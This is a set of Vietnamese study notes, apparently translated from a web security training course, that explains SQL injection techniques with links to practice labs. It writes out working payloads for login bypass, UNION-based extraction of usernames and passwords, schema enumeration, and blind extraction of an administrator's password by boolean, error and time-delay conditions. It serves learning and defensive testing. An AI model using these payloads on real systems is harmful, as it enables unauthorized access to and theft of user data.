# **What is SQL injection (SQLi)?**

là một lỗ hổng bảo mật web cho phép kẻ tấn công can thiệp vào các truy vấn mà ứng dụng gửi đến cơ sở dữ liệu. Điều này có thể cho phép kẻ tấn công xem được những dữ liệu mà bình thường họ không thể truy cập, bao gồm dữ liệu của người dùng khác hoặc bất kỳ dữ liệu nào mà ứng dụng có quyền truy cập. Trong nhiều trường hợp, kẻ tấn công có thể chỉnh sửa hoặc xóa dữ liệu này, gây ra những thay đổi lâu dài đối với nội dung hoặc hành vi của ứng dụng.

Trong một số tình huống, kẻ tấn công có thể leo thang cuộc tấn công SQL Injection để xâm nhập vào máy chủ bên dưới hoặc các hệ thống backend khác. Điều này cũng có thể cho phép họ thực hiện các cuộc tấn công từ chối dịch vụ (DoS).

# **How to detect SQL injection vulnerabilities ( phát hiện)**

Bạn có thể phát hiện SQL injection theo cách thủ công bằng cách sử dụng một tập hợp các kiểm tra có hệ thống đối với mọi điểm nhập liệu trong ứng dụng. Để làm điều này, bạn thường sẽ gửi:

- Ký tự dấu nháy đơn `'` và quan sát lỗi hoặc các bất thường khác.
- Một số cú pháp SQL cụ thể đánh giá về giá trị cơ sở (ban đầu) của điểm nhập và về một giá trị khác, rồi quan sát sự khác biệt có hệ thống trong phản hồi của ứng dụng.
- Các điều kiện boolean như `OR 1=1` và `OR 1=2`, và quan sát sự khác biệt trong phản hồi của ứng dụng.
- Các payload được thiết kế để kích hoạt độ trễ thời gian khi được thực thi trong truy vấn SQL, và quan sát sự khác biệt về thời gian phản hồi.
- Các payload OAST được thiết kế để kích hoạt tương tác mạng ngoài băng tần khi được thực thi trong truy vấn SQL, và theo dõi các tương tác phát sinh.

# **SQL injection in different parts of the query ( lỗ hổng tấn công nhiều phần khác nhau của truy vấn)**

Hầu hết các lỗ hổng SQL injection xảy ra trong mệnh đề **WHERE** của truy vấn **SELECT**. Hầu hết các tester có kinh nghiệm đều quen thuộc với dạng SQL injection này.

Tuy nhiên, lỗ hổng SQL injection có thể xuất hiện ở bất kỳ vị trí nào trong truy vấn và trong các loại truy vấn khác nhau. Một số vị trí phổ biến khác bao gồm:

- Trong các câu lệnh **UPDATE**, ở các giá trị được cập nhật hoặc trong mệnh đề **WHERE**.
- Trong các câu lệnh **INSERT**, ở các giá trị được chèn vào.
- Trong các câu lệnh **SELECT**, ở tên bảng hoặc tên cột.
- Trong các câu lệnh **SELECT**, trong mệnh đề **ORDER BY**.

# **Retrieving hidden data ( khôi phục data ẩn)**

Hãy tưởng tượng một ứng dụng mua sắm hiển thị các sản phẩm theo nhiều danh mục khác nhau. Khi người dùng nhấp vào danh mục **Gifts**, trình duyệt của họ sẽ gửi một yêu cầu đến URL:

```jsx
https://insecure-website.com/products?category=Gifts
```

Điều này khiến ứng dụng thực hiện truy vấn SQL để lấy thông tin chi tiết về các sản phẩm liên quan từ cơ sở dữ liệu:

```jsx
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Truy vấn SQL này yêu cầu cơ sở dữ liệu trả về:

- tất cả thông tin (*)
- (FROM) từ bảng **products**
- nơi mà danh mục là **Gifts ( where category =’Gifts’)**
- và **released = 1**.

Điều kiện **released = 1** được sử dụng để ẩn các sản phẩm chưa được phát hành. Ta có thể giả định rằng đối với các sản phẩm chưa phát hành, **released = 0**.

# **Retrieving hidden data - Continued(Truy xuất dữ liệu bị ẩn - tiếp tục)**

Ứng dụng không triển khai bất kỳ cơ chế phòng chống SQL Injection nào. Điều này có nghĩa là kẻ tấn công có thể tạo ra một tấn công như sau, ví dụ:

```
https://insecure-website.com/products?category=Gifts'--
```

Điều này dẫn đến truy vấn SQL:

```
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

Điểm quan trọng là `--` là ký hiệu comment trong SQL. Điều này có nghĩa là phần còn lại của truy vấn sẽ bị coi là comment và bị bỏ qua.

Trong ví dụ này, truy vấn sẽ không còn chứa điều kiện `AND released = 1`. Kết quả là tất cả các sản phẩm sẽ được hiển thị, bao gồm cả những sản phẩm chưa được phát hành.

Bạn cũng có thể sử dụng một kiểu tấn công tương tự để khiến ứng dụng hiển thị tất cả sản phẩm trong bất kỳ danh mục nào, bao gồm cả những danh mục mà bạn không biết đến.

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

Điều này dẫn đến truy vấn SQL:

```
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

Truy vấn đã bị chỉnh sửa sẽ trả về tất cả các mục mà hoặc danh mục là **Gifts**, hoặc điều kiện **1=1** đúng. Vì **1=1** luôn đúng, truy vấn sẽ trả về toàn bộ dữ liệu.

**Cảnh báo:** Cần cẩn thận khi chèn điều kiện **OR 1=1** vào truy vấn SQL. Dù có vẻ vô hại trong ngữ cảnh bạn đang khai thác, nhưng các ứng dụng thường sử dụng dữ liệu từ một request cho nhiều truy vấn khác nhau. Nếu điều kiện này ảnh hưởng đến các câu lệnh **UPDATE** hoặc **DELETE**, nó có thể gây ra việc mất dữ liệu ngoài ý muốn.

[**Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data** (1)](https://www.notion.so/Lab-SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data-1-3754b66543f980c5a50aefb40c22c577?pvs=21)

# **Subverting application logic (Phá vỡ logic ứng dụng)**

Hãy tưởng tượng một ứng dụng cho phép người dùng đăng nhập bằng tên người dùng và mật khẩu. Nếu người dùng nhập tên người dùng `wiener` và mật khẩu `bluecheese`, ứng dụng sẽ kiểm tra thông tin bằng cách thực hiện truy vấn SQL sau:

```jsx
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese’
```

Nếu truy vấn trả về thông tin của một người dùng, thì đăng nhập thành công. Nếu không, đăng nhập sẽ bị từ chối.

Trong trường hợp này, kẻ tấn công có thể đăng nhập vào bất kỳ tài khoản nào mà không cần mật khẩu. Chúng có thể làm điều này bằng cách sử dụng chuỗi comment SQL `--` để loại bỏ phần kiểm tra mật khẩu khỏi mệnh đề WHERE của truy vấn. Ví dụ, nếu nhập tên người dùng `administrator'--` và để trống mật khẩu, sẽ tạo ra truy vấn sau:

```jsx
SELECT * FROM users WHERE username = 'administrator'--' AND password = '’
```

Truy vấn này trả về user có tên là `administrator` và cho phép kẻ tấn công đăng nhập thành công vào tài khoản đó.

[**Lab: SQL injection vulnerability allowing login bypass** (1)](https://www.notion.so/Lab-SQL-injection-vulnerability-allowing-login-bypass-1-3754b66543f9801b9ea5cf656019fa9d?pvs=21)

# **SQL injection UNION attacks**

Khi một ứng dụng tồn tại lỗ hổng SQL injection, và kết quả của truy vấn được trả về trong phản hồi của ứng dụng, bạn có thể sử dụng từ khóa UNION để lấy dữ liệu từ các bảng khác trong cơ sở dữ liệu. Điều này thường được gọi là tấn công SQL injection UNION.

Từ khóa UNION cho phép bạn thực thi một hoặc nhiều truy vấn SELECT bổ sung và nối kết quả của chúng vào truy vấn ban đầu. Ví dụ:

```
SELECT a, bFROM table1UNIONSELECT c, dFROM table2
```

Truy vấn SQL này trả về một tập kết quả duy nhất với hai cột, chứa các giá trị từ cột a và b trong table1 và các cột c và d trong table2.

# **Tấn công SQL injection UNION - Tiếp tục**

Để một truy vấn UNION hoạt động, cần thỏa mãn hai yêu cầu chính:

- Các truy vấn riêng lẻ phải trả về cùng số lượng cột.
- Kiểu dữ liệu trong mỗi cột phải tương thích giữa các truy vấn.

Để thực hiện một cuộc tấn công SQL injection UNION, bạn cần đảm bảo rằng payload của mình đáp ứng hai yêu cầu này. Điều này thường bao gồm việc xác định:

- Có bao nhiêu cột được trả về từ truy vấn ban đầu.
- Những cột nào trong truy vấn ban đầu có kiểu dữ liệu phù hợp để chứa kết quả từ truy vấn được chèn vào.

# **Determining the number of columns required (Xác định số lượng cột cần thiết)**

Khi thực hiện một cuộc tấn công SQL injection sử dụng UNION, có hai phương pháp hiệu quả để xác định có bao nhiêu cột được trả về từ truy vấn ban đầu.

Một phương pháp là chèn một loạt các mệnh đề ORDER BY và tăng dần chỉ số cột được chỉ định cho đến khi xảy ra lỗi. Ví dụ, nếu điểm chèn nằm trong một chuỗi được đặt trong dấu nháy đơn trong mệnh đề WHERE của truy vấn ban đầu, bạn sẽ gửi:

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

Chuỗi payload này sẽ sửa đổi truy vấn ban đầu để sắp xếp kết quả theo các cột khác nhau trong tập kết quả. Cột trong mệnh đề ORDER BY có thể được chỉ định bằng chỉ số của nó, vì vậy bạn không cần biết tên của bất kỳ cột nào. Khi chỉ số cột được chỉ định vượt quá số lượng cột thực tế trong tập kết quả, cơ sở dữ liệu sẽ trả về lỗi, ví dụ như:

```
The ORDER BY position number 3 is out of range of the number of items in the select list.
```

Ứng dụng có thể trả về lỗi cơ sở dữ liệu này trong phản hồi HTTP, nhưng cũng có thể chỉ trả về một lỗi chung. Trong một số trường hợp khác, nó có thể đơn giản là không trả về kết quả nào. Dù bằng cách nào, miễn là bạn có thể nhận thấy sự khác biệt trong phản hồi, bạn có thể suy ra được có bao nhiêu cột đang được trả về từ truy vấn.

# **Determining the number of columns required - Continued (Xác định số lượng cột cần thiết - Tiếp tục)**

Phương pháp thứ hai là gửi một loạt payload UNION SELECT với số lượng giá trị NULL khác nhau:

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

Nếu số lượng giá trị NULL không khớp với số lượng cột, cơ sở dữ liệu sẽ trả về lỗi, ví dụ như:

```
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```

Chúng ta sử dụng NULL làm giá trị trả về từ truy vấn SELECT được chèn vào vì kiểu dữ liệu của mỗi cột phải tương thích giữa truy vấn ban đầu và truy vấn được chèn. NULL có thể chuyển đổi sang mọi kiểu dữ liệu phổ biến, nên nó giúp tăng khả năng payload thành công khi số lượng cột là đúng.

Tương tự như kỹ thuật ORDER BY, ứng dụng có thể trả về lỗi cơ sở dữ liệu trong phản hồi HTTP, nhưng cũng có thể chỉ trả về lỗi chung hoặc không trả về kết quả nào. Khi số lượng NULL khớp với số lượng cột, cơ sở dữ liệu sẽ trả về thêm một dòng trong tập kết quả, chứa các giá trị NULL ở mỗi cột. Ảnh hưởng đến phản hồi HTTP phụ thuộc vào code của ứng dụng. Nếu may mắn, bạn sẽ thấy nội dung bổ sung trong phản hồi, chẳng hạn như một dòng thêm trong bảng HTML. Ngược lại, các giá trị NULL có thể gây ra lỗi khác, như NullPointerException. Trong trường hợp xấu nhất, phản hồi có thể giống hệt như khi số lượng NULL không đúng, khiến phương pháp này không hiệu quả.

[**Lab: SQL injection UNION attack, determining the number of columns returned by the query** (1)](https://www.notion.so/Lab-SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query-1-3754b66543f980b89052e8a005d19558?pvs=21)

**Cú pháp riêng của từng cơ sở dữ liệu (Database-specific syntax)**

Trên Oracle, mọi truy vấn SELECT đều phải sử dụng từ khóa FROM và chỉ định một bảng hợp lệ. Oracle có một bảng dựng sẵn tên là `dual` có thể được sử dụng cho mục đích này. Vì vậy, các truy vấn được chèn vào trên Oracle sẽ có dạng:

```
' UNION SELECT NULL FROM DUAL--
```

Các payload được mô tả sử dụng chuỗi comment dấu gạch đôi `--` để vô hiệu hóa phần còn lại của truy vấn ban đầu sau điểm chèn. Trên MySQL, chuỗi `--` phải được theo sau bởi một khoảng trắng. Ngoài ra, ký tự `#` cũng có thể được sử dụng để đánh dấu comment.

Để biết thêm chi tiết về cú pháp riêng của từng hệ quản trị cơ sở dữ liệu, hãy xem tài liệu “SQL injection cheat sheet”.

**Tìm các cột có kiểu dữ liệu hữu ích**

Một cuộc tấn công SQL injection sử dụng UNION cho phép bạn lấy kết quả từ truy vấn được chèn vào. Dữ liệu quan trọng mà bạn muốn lấy thường ở dạng chuỗi (string). Điều này có nghĩa là bạn cần tìm một hoặc nhiều cột trong kết quả truy vấn ban đầu có kiểu dữ liệu là, hoặc tương thích với, dữ liệu chuỗi.

Sau khi xác định được số lượng cột cần thiết, bạn có thể kiểm tra từng cột để xem nó có thể chứa dữ liệu chuỗi hay không. Bạn có thể gửi một loạt payload UNION SELECT, trong đó đặt một giá trị chuỗi vào từng cột lần lượt. Ví dụ, nếu truy vấn trả về bốn cột, bạn sẽ gửi:

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

Nếu kiểu dữ liệu của cột không tương thích với dữ liệu chuỗi, truy vấn được chèn sẽ gây ra lỗi cơ sở dữ liệu, ví dụ như:

```
Conversion failed when converting the varchar value 'a' to data type int.
```

Nếu không xảy ra lỗi, và phản hồi của ứng dụng chứa thêm nội dung bao gồm giá trị chuỗi được chèn vào, thì cột tương ứng phù hợp để truy xuất dữ liệu dạng chuỗi.

[**Lab: SQL injection UNION attack, finding a column containing text** (1)](https://www.notion.so/Lab-SQL-injection-UNION-attack-finding-a-column-containing-text-1-3754b66543f9808c88b3c090b56ac568?pvs=21)

**Sử dụng tấn công SQL injection UNION để truy xuất dữ liệu quan trọng**

Khi bạn đã xác định được số lượng cột được trả về từ truy vấn ban đầu và tìm ra những cột có thể chứa dữ liệu dạng chuỗi, bạn có thể tiến hành truy xuất dữ liệu quan trọng.

Giả sử rằng:

- Truy vấn ban đầu trả về hai cột, và cả hai đều có thể chứa dữ liệu dạng chuỗi.
- Điểm chèn nằm trong một chuỗi được đặt trong dấu nháy đơn trong mệnh đề WHERE.
- Cơ sở dữ liệu có một bảng tên là `users` với các cột `username` và `password`.

Trong ví dụ này, bạn có thể lấy nội dung của bảng `users` bằng cách gửi input sau:

```
' UNION SELECT username, password FROM users--
```

Để thực hiện cuộc tấn công này, bạn cần biết rằng tồn tại bảng `users` với hai cột `username` và `password`. Nếu không có thông tin này, bạn sẽ phải đoán tên các bảng và cột. Tất cả các cơ sở dữ liệu hiện đại đều cung cấp các cách để kiểm tra cấu trúc cơ sở dữ liệu và xác định các bảng cũng như các cột mà chúng chứa.

[**Lab: SQL injection UNION attack, retrieving data from other tables** (1)](https://www.notion.so/Lab-SQL-injection-UNION-attack-retrieving-data-from-other-tables-1-3754b66543f98078811bddce32358119?pvs=21)

**Truy xuất nhiều giá trị trong một cột duy nhất (Retrieving multiple values within a single column)**

Trong một số trường hợp, truy vấn trong ví dụ trước có thể chỉ trả về một cột duy nhất.

Bạn có thể truy xuất nhiều giá trị trong cột này bằng cách nối (concatenate) các giá trị lại với nhau. Bạn có thể thêm một ký tự phân tách để dễ phân biệt các giá trị đã được nối. Ví dụ, trên Oracle, bạn có thể gửi input sau:

```
' UNION SELECT username || '~' || password FROM users--
```

Câu lệnh này sử dụng toán tử `||` (hai dấu gạch đứng), là toán tử nối chuỗi trong Oracle. Truy vấn được chèn sẽ nối các giá trị của trường `username` và `password`, được phân tách bởi ký tự `~`.

Kết quả từ truy vấn sẽ chứa tất cả tên người dùng và mật khẩu, ví dụ:

```
...
administrator~s3cure
wiener~peter
carlos~montoya
...
```

Các hệ quản trị cơ sở dữ liệu khác nhau sử dụng cú pháp khác nhau để nối chuỗi. Để biết thêm chi tiết, hãy xem tài liệu “SQL injection cheat sheet”.

[**Lab: SQL injection UNION attack, retrieving multiple values in a single column** (1)](https://www.notion.so/Lab-SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column-1-3754b66543f98040a8a0fc6eaa7001ff?pvs=21)

**Examining the database in SQL injection attacks(Khám phá cơ sở dữ liệu trong các cuộc tấn công SQL injection)**

Để khai thác các lỗ hổng SQL injection, thường cần phải tìm thông tin về cơ sở dữ liệu. Điều này bao gồm:

- Loại và phiên bản của phần mềm cơ sở dữ liệu.
- Các bảng và cột mà cơ sở dữ liệu chứa.

**Querying the database type and version(Truy vấn loại và phiên bản cơ sở dữ liệu)**

Bạn có thể xác định loại và phiên bản cơ sở dữ liệu bằng cách chèn các truy vấn đặc thù của từng hệ quản trị và kiểm tra xem truy vấn nào hoạt động.

Dưới đây là một số truy vấn dùng để xác định phiên bản cơ sở dữ liệu phổ biến:

| Loại cơ sở dữ liệu | Truy vấn |
| --- | --- |
| Microsoft, MySQL | `SELECT @@version` |
| Oracle | `SELECT * FROM v$version` |
| PostgreSQL | `SELECT version()` |

Ví dụ, bạn có thể sử dụng tấn công UNION với input sau:

```
' UNION SELECT @@version--
```

Kết quả có thể trả về như sau. Trong trường hợp này, bạn có thể xác nhận rằng cơ sở dữ liệu là Microsoft SQL Server và biết được phiên bản đang sử dụng:

```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14
```

[**Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft** (1)](https://www.notion.so/Lab-SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft-1-3754b66543f9808baefae20eb9d62a6e?pvs=21)

**Listing the contents of the database(Liệt kê nội dung của cơ sở dữ liệu)**

Hầu hết các hệ quản trị cơ sở dữ liệu (ngoại trừ Oracle) đều có một tập hợp các view gọi là *information schema*. Nó cung cấp thông tin về cơ sở dữ liệu.

Ví dụ, bạn có thể truy vấn `information_schema.tables` để liệt kê các bảng trong cơ sở dữ liệu:

```
SELECT*FROM information_schema.tables
```

Truy vấn này trả về kết quả như sau:

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

Kết quả này cho thấy có ba bảng: `Products`, `Users`, và `Feedback`.

Sau đó, bạn có thể truy vấn `information_schema.columns` để liệt kê các cột trong từng bảng:

```
SELECT*FROM information_schema.columnsWHERE table_name='Users'
```

Truy vấn này trả về kết quả như sau:

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```

Kết quả này hiển thị các cột trong bảng được chỉ định và kiểu dữ liệu của từng cột.

[**Lab: SQL injection attack, listing the database contents on non-Oracle databases** (1)](https://www.notion.so/Lab-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases-1-3754b66543f9804294acd17825035185?pvs=21)

**SQL injection mù (Blind SQL injection)**

Trong phần này, chúng tôi mô tả các kỹ thuật để phát hiện và khai thác các lỗ hổng SQL injection mù.

**Blind SQL injection là gì?**

Blind SQL injection xảy ra khi một ứng dụng tồn tại lỗ hổng SQL injection, nhưng phản hồi HTTP của nó không chứa kết quả của truy vấn SQL liên quan hoặc thông tin chi tiết về bất kỳ lỗi cơ sở dữ liệu nào.

Nhiều kỹ thuật như tấn công UNION không hiệu quả với các lỗ hổng blind SQL injection. Điều này là do chúng phụ thuộc vào việc có thể nhìn thấy kết quả của truy vấn được chèn trong phản hồi của ứng dụng. Tuy nhiên, vẫn có thể khai thác blind SQL injection để truy cập dữ liệu trái phép, nhưng phải sử dụng các kỹ thuật khác.

**Khai thác blind SQL injection bằng cách kích hoạt phản hồi có điều kiện(Exploiting blind SQL injection by triggering conditional responses)**

Hãy xem xét một ứng dụng sử dụng cookie theo dõi để thu thập dữ liệu phân tích về việc sử dụng. Các request gửi đến ứng dụng bao gồm một header cookie như sau:

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

Khi một request chứa cookie TrackingId được xử lý, ứng dụng sử dụng một truy vấn SQL để xác định xem đây có phải là người dùng đã biết hay không:

```
SELECT TrackingIdFROM TrackedUsersWHERE TrackingId='u5YD3PapBcR4lN3e7Tj4'
```

Truy vấn này tồn tại lỗ hổng SQL injection, nhưng kết quả của truy vấn không được trả về cho người dùng. Tuy nhiên, ứng dụng lại có hành vi khác nhau tùy thuộc vào việc truy vấn có trả về dữ liệu hay không. Nếu bạn gửi một TrackingId hợp lệ, truy vấn sẽ trả về dữ liệu và bạn sẽ nhận được thông báo "Welcome back" trong phản hồi.

Hành vi này là đủ để có thể khai thác lỗ hổng blind SQL injection. Bạn có thể truy xuất thông tin bằng cách tạo ra các phản hồi khác nhau một cách có điều kiện, dựa trên điều kiện được chèn vào.

**Khai thác blind SQL injection bằng cách kích hoạt phản hồi có điều kiện - Tiếp tục**

Để hiểu cách khai thác này hoạt động, giả sử rằng hai request được gửi với các giá trị cookie TrackingId sau:

```
…xyz' AND '1'='1
…xyz' AND '1'='2
```

Giá trị đầu tiên khiến truy vấn trả về kết quả, vì điều kiện được chèn `AND '1'='1` là đúng. Do đó, thông báo "Welcome back" sẽ được hiển thị.

Giá trị thứ hai khiến truy vấn không trả về kết quả, vì điều kiện được chèn là sai. Thông báo "Welcome back" sẽ không được hiển thị.

Điều này cho phép chúng ta xác định kết quả của bất kỳ điều kiện nào được chèn vào, và trích xuất dữ liệu từng phần một.

**Khai thác blind SQL injection bằng cách kích hoạt phản hồi có điều kiện - Tiếp tục**

Ví dụ, giả sử có một bảng tên là `Users` với các cột `Username` và `Password`, và có một người dùng tên là `Administrator`. Bạn có thể xác định mật khẩu của người dùng này bằng cách gửi một loạt input để kiểm tra từng ký tự của mật khẩu.

Để làm điều này, bắt đầu với input sau:

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

Request này trả về thông báo "Welcome back", cho thấy điều kiện được chèn là đúng, và do đó ký tự đầu tiên của mật khẩu lớn hơn `m`.

Tiếp theo, gửi input sau:

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

Request này không trả về thông báo "Welcome back", cho thấy điều kiện là sai, và do đó ký tự đầu tiên của mật khẩu không lớn hơn `t`.

Cuối cùng, gửi input sau, và nhận được thông báo "Welcome back", xác nhận rằng ký tự đầu tiên của mật khẩu là `s`:

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

Bạn có thể tiếp tục quá trình này để xác định toàn bộ mật khẩu của người dùng `Administrator` một cách có hệ thống.

**Lưu ý:**

Hàm `SUBSTRING` được gọi là `SUBSTR` trên một số hệ quản trị cơ sở dữ liệu. Để biết thêm chi tiết, hãy xem tài liệu “SQL injection cheat sheet”.

[**Lab: Blind SQL injection with conditional responses** (1)](https://www.notion.so/Lab-Blind-SQL-injection-with-conditional-responses-1-3754b66543f98029b4b4db708414a7dd?pvs=21)

**SQL injection dựa trên lỗi (Error-based SQL injection)**

Error-based SQL injection đề cập đến các trường hợp mà bạn có thể sử dụng thông báo lỗi để trích xuất hoặc suy ra dữ liệu nhạy cảm từ cơ sở dữ liệu, ngay cả trong các tình huống blind. Khả năng khai thác phụ thuộc vào cấu hình của cơ sở dữ liệu và loại lỗi mà bạn có thể kích hoạt:

- Bạn có thể khiến ứng dụng trả về một thông báo lỗi cụ thể dựa trên kết quả của một biểu thức boolean. Bạn có thể khai thác điều này theo cách tương tự như các phản hồi có điều kiện đã đề cập ở phần trước. Để biết thêm thông tin, xem phần khai thác blind SQL injection bằng cách kích hoạt lỗi có điều kiện.
- Bạn có thể kích hoạt các thông báo lỗi hiển thị dữ liệu được trả về từ truy vấn. Điều này giúp biến các lỗ hổng SQL injection dạng blind thành dạng có thể quan sát được. Để biết thêm thông tin, xem phần trích xuất dữ liệu nhạy cảm thông qua thông báo lỗi SQL chi tiết.

**Khai thác blind SQL injection bằng cách kích hoạt lỗi có điều kiện**

Một số ứng dụng thực hiện truy vấn SQL nhưng hành vi của chúng không thay đổi, bất kể truy vấn có trả về dữ liệu hay không. Kỹ thuật ở phần trước sẽ không hoạt động, vì việc chèn các điều kiện boolean khác nhau không tạo ra sự khác biệt trong phản hồi của ứng dụng.

Tuy nhiên, thường có thể khiến ứng dụng trả về phản hồi khác nhau tùy thuộc vào việc có xảy ra lỗi SQL hay không. Bạn có thể chỉnh sửa truy vấn để nó chỉ gây ra lỗi cơ sở dữ liệu khi điều kiện là đúng. Rất thường, một lỗi không được xử lý từ cơ sở dữ liệu sẽ làm thay đổi phản hồi của ứng dụng, chẳng hạn như hiển thị thông báo lỗi. Điều này cho phép bạn suy ra tính đúng/sai của điều kiện được chèn vào.

**Khai thác blind SQL injection bằng cách kích hoạt lỗi có điều kiện - Tiếp tục**

Để hiểu cách hoạt động, giả sử hai request được gửi với các giá trị cookie TrackingId sau:

```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

Các input này sử dụng từ khóa CASE để kiểm tra một điều kiện và trả về biểu thức khác nhau tùy thuộc vào việc điều kiện đúng hay sai:

- Với input đầu tiên, biểu thức CASE trả về `'a'`, không gây ra lỗi.
- Với input thứ hai, biểu thức trả về `1/0`, gây ra lỗi chia cho 0.

Nếu lỗi này làm thay đổi phản hồi HTTP của ứng dụng, bạn có thể sử dụng điều đó để xác định điều kiện được chèn là đúng hay sai.

Sử dụng kỹ thuật này, bạn có thể truy xuất dữ liệu bằng cách kiểm tra từng ký tự một:

```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

**Lưu ý:**

Có nhiều cách khác nhau để kích hoạt lỗi có điều kiện, và mỗi kỹ thuật có thể phù hợp hơn với từng loại cơ sở dữ liệu khác nhau. Để biết thêm chi tiết, hãy xem tài liệu “SQL injection cheat sheet”.

[**Lab: Blind SQL injection with conditional errors** (1)](https://www.notion.so/Lab-Blind-SQL-injection-with-conditional-errors-1-3754b66543f980578a87fc3e6f3acb60?pvs=21)

**Trích xuất dữ liệu nhạy cảm thông qua thông báo lỗi SQL chi tiết**

Cấu hình sai của cơ sở dữ liệu đôi khi dẫn đến các thông báo lỗi chi tiết. Những thông báo này có thể cung cấp thông tin hữu ích cho kẻ tấn công. Ví dụ, xem xét thông báo lỗi sau, xuất hiện sau khi chèn một dấu nháy đơn vào tham số `id`:

```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

Thông báo này hiển thị toàn bộ truy vấn mà ứng dụng đã tạo ra từ input của chúng ta. Trong trường hợp này, ta có thể thấy rằng việc chèn dữ liệu đang diễn ra trong một chuỗi được đặt trong dấu nháy đơn bên trong mệnh đề WHERE. Điều này giúp dễ dàng hơn trong việc xây dựng một truy vấn hợp lệ chứa payload độc hại. Việc comment phần còn lại của truy vấn sẽ ngăn dấu nháy đơn dư thừa làm lỗi cú pháp.

**Trích xuất dữ liệu nhạy cảm thông qua thông báo lỗi SQL chi tiết - Tiếp tục**

Đôi khi, bạn có thể khiến ứng dụng tạo ra một thông báo lỗi chứa một phần dữ liệu được trả về từ truy vấn. Điều này giúp biến một lỗ hổng SQL injection dạng blind thành dạng có thể quan sát được.

Bạn có thể sử dụng hàm `CAST()` để thực hiện điều này. Hàm này cho phép chuyển đổi một kiểu dữ liệu sang kiểu khác. Ví dụ, hãy tưởng tượng một truy vấn chứa câu lệnh sau:

```
CAST((SELECT example_column FROM example_table) AS int)
```

Thông thường, dữ liệu bạn muốn đọc là dạng chuỗi. Việc cố gắng chuyển nó sang một kiểu dữ liệu không tương thích, chẳng hạn như `int`, có thể gây ra lỗi như sau:

```
ERROR: invalid input syntax for type integer: "Example data"
```

Loại truy vấn này cũng có thể hữu ích nếu giới hạn ký tự ngăn bạn kích hoạt các phản hồi có điều kiện.

[**Lab: Visible error-based SQL injection** (1)](https://www.notion.so/Lab-Visible-error-based-SQL-injection-1-3754b66543f98068a6a7eb2f0d5a1845?pvs=21)

**Khai thác blind SQL injection bằng cách tạo độ trễ thời gian**

Nếu ứng dụng bắt lỗi cơ sở dữ liệu khi truy vấn SQL được thực thi và xử lý chúng một cách “êm ái”, thì sẽ không có sự khác biệt trong phản hồi của ứng dụng. Điều này khiến kỹ thuật kích hoạt lỗi có điều kiện ở phần trước không hoạt động.

Trong trường hợp này, thường có thể khai thác lỗ hổng blind SQL injection bằng cách tạo độ trễ thời gian tùy thuộc vào việc điều kiện được chèn là đúng hay sai. Vì các truy vấn SQL thường được xử lý đồng bộ bởi ứng dụng, việc làm chậm quá trình thực thi truy vấn cũng sẽ làm chậm phản hồi HTTP. Điều này cho phép bạn xác định tính đúng/sai của điều kiện được chèn dựa trên thời gian nhận được phản hồi HTTP.

**Khai thác blind SQL injection bằng cách tạo độ trễ thời gian - Tiếp tục**

Các kỹ thuật để tạo độ trễ thời gian phụ thuộc vào loại cơ sở dữ liệu đang được sử dụng. Ví dụ, trên Microsoft SQL Server, bạn có thể sử dụng các câu lệnh sau để kiểm tra một điều kiện và tạo độ trễ tùy thuộc vào việc biểu thức là đúng hay sai:

```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

Input đầu tiên không gây ra độ trễ vì điều kiện `1=2` là sai.

Input thứ hai gây ra độ trễ 10 giây vì điều kiện `1=1` là đúng.

Sử dụng kỹ thuật này, bạn có thể truy xuất dữ liệu bằng cách kiểm tra từng ký tự một:

```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

**Lưu ý:**

Có nhiều cách khác nhau để tạo độ trễ trong truy vấn SQL, và mỗi kỹ thuật sẽ phù hợp với từng loại cơ sở dữ liệu khác nhau. Để biết thêm chi tiết, hãy xem tài liệu “SQL injection cheat sheet”.

